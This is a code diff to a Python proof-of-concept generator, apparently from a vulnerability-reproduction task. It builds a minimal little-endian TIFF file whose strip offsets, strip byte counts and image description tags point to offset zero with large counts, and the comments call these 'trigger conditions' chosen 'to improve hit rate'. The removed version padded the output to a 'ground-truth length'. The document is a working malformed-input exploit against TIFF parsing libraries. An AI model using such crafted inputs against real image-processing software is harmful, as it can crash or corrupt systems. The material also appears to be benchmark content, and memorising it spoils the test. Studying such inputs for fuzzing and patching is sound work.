@@ -2,55 +2,28 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        le16 = lambda x: struct.pack("<H", x & 0xFFFF)
-        le32 = lambda x: struct.pack("<I", x & 0xFFFFFFFF)
+        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
+            return struct.pack("<HHII", tag & 0xFFFF, typ & 0xFFFF, count & 0xFFFFFFFF, value_or_offset & 0xFFFFFFFF)
 
-        # TIFF header (little-endian): 'II' 42, first IFD at offset 8
-        out = bytearray()
-        out += b"II"
-        out += le16(42)
-        out += le32(8)
+        # Classic TIFF, little-endian, first IFD at offset 8
+        header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
 
-        # IFD with 10 entries
-        num_entries = 10
-        ifd_start = 8
-        ifd_size = 2 + num_entries * 12 + 4
-        pixel_offset = ifd_start + ifd_size
-
-        def ifd_entry(tag, typ, count, value_or_offset):
-            return le16(tag) + le16(typ) + le32(count) + le32(value_or_offset)
-
-        # Types: 1=BYTE, 2=ASCII, 3=SHORT, 4=LONG
         entries = []
-        entries.append(ifd_entry(256, 4, 1, 1))                 # ImageWidth
-        entries.append(ifd_entry(257, 4, 1, 1))                 # ImageLength
-        entries.append(ifd_entry(258, 3, 1, 8))                 # BitsPerSample = 8
-        entries.append(ifd_entry(259, 3, 1, 1))                 # Compression = none
-        entries.append(ifd_entry(262, 3, 1, 1))                 # Photometric = BlackIsZero
-        entries.append(ifd_entry(273, 4, 1, pixel_offset))      # StripOffsets -> pixel data
-        entries.append(ifd_entry(277, 3, 1, 1))                 # SamplesPerPixel = 1
-        entries.append(ifd_entry(278, 4, 1, 1))                 # RowsPerStrip = 1
-        entries.append(ifd_entry(279, 4, 1, 1))                 # StripByteCounts = 1
+        # Minimal baseline tags
+        entries.append(ifd_entry(256, 4, 1, 1))      # ImageWidth = 1
+        entries.append(ifd_entry(257, 4, 1, 100))    # ImageLength = 100
+        entries.append(ifd_entry(258, 3, 1, 8))      # BitsPerSample = 8
+        entries.append(ifd_entry(259, 3, 1, 1))      # Compression = 1 (none)
+        entries.append(ifd_entry(262, 3, 1, 1))      # PhotometricInterpretation = 1 (BlackIsZero)
 
-        # Trigger: offline (out-of-line) tag with value offset 0 and large count
-        # Artist (315), ASCII, count 200, offset 0
-        entries.append(ifd_entry(315, 2, 200, 0))
+        # Trigger conditions: offline tag(s) with value offset of zero
+        entries.append(ifd_entry(273, 4, 100, 0))    # StripOffsets[100] at offset 0 (invalid)
+        entries.append(ifd_entry(277, 3, 1, 1))      # SamplesPerPixel = 1
+        entries.append(ifd_entry(278, 4, 1, 1))      # RowsPerStrip = 1
+        entries.append(ifd_entry(279, 4, 100, 0))    # StripByteCounts[100] at offset 0 (invalid)
 
-        out += le16(num_entries)
-        for e in entries:
-            out += e
-        out += le32(0)  # next IFD offset
+        # Additional offline tag with offset 0 to improve hit rate
+        entries.append(ifd_entry(270, 2, 1024, 0))   # ImageDescription[1024] at offset 0 (invalid)
 
-        # Pixel data at pixel_offset: 1 byte
-        if len(out) < pixel_offset:
-            out += b"\x00" * (pixel_offset - len(out))
-        out += b"\x00"
-
-        # Pad to 162 bytes (ground-truth length)
-        target_len = 162
-        if len(out) < target_len:
-            out += b"\x00" * (target_len - len(out))
-        else:
-            out = out[:target_len]
-
-        return bytes(out)
+        ifd = struct.pack("<H", len(entries)) + b"".join(entries) + struct.pack("<I", 0)
+        return header + ifd
